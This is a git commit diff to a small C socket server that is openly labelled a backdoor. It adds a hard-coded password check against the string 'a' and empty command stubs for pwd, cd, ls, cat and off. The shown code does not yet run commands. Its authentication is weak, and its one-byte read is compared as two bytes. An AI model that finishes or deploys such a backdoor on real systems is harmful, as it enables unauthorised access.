3ccf15504eb4fd419c60a7d3b576b1a042ead2b3
emCsq <emcsq@live.ca>
2017-01-26 22:00:49 -0700

    updated.

--- Server.c
+++ Server.c
@@ -22,10 +22,11 @@ int main(int argc, char *argv[])
     int sockfd, newsockfd, portno;
     socklen_t clilen;
     char buffer[256];
-    char password[] = "a";
+    char password[] = "a\n";
     struct sockaddr_in serv_addr, cli_addr;
     int n;
-    int offStatus = 1;
+    int offStatus = 1, runEnd = 1;
+    int i_counter;
     if (argc < 2) {
         fprintf(stderr,"ERROR, no port provided\n");
         exit(1);
@@ -50,7 +51,7 @@ int main(int argc, char *argv[])
         error("ERROR on accept");
     
     /*
-    *code for the inmpementation of the project
+    *code for the implementation of the project
     *over all loop
     */
     /*
@@ -64,22 +65,41 @@ int main(int argc, char *argv[])
     if(n<0) offStatus = 0;
     n = read(newsockfd, buffer, 1);
     printf("%s\n", buffer);
-    if (strcmp(password, buffer) != 0 )
+    if (strncmp(password, buffer, 2) != 0 )
     {
         printf("%d\n", strcmp(password,buffer));
         error("Error: incorrect password");
         offStatus = 0;
     }
     n = write(newsockfd, "Welcome to this backdoor", 26);
-
     do {
-
         bzero(buffer,256);
         n = read(newsockfd,buffer,255);
+        //find the command
+        if(strncmp(buffer, "help\n", 5) == 0){
+            printf("We are in help");
+        }
         if (n < 0) error("ERROR reading from socket");
         printf("Here is the message: %s\n",buffer);
         n = write(newsockfd,"I got your message",18);
         if (n < 0) error("ERROR writing to socket");
+        
+        if (strncmp(buffer, "pwd\n", 4) == 0) {
+            
+        } else if (strncmp(buffer, "cd ", 3) == 0) {
+            //if things exist, con't
+        } else if (strncmp(buffer, "ls\n", 3) == 0) {
+            
+        } else if (strncmp(buffer, "cat ", 3) == 0) {
+            //if things exist, con't
+        } else if (strncmp(buffer, "help\n", 5) == 0) {
+            
+        } else if (strncmp(buffer, "off\n", 4) == 0) {
+            
+        } else {
+            
+        }
+        
     }while (offStatus == 1);
     
     close(newsockfd);
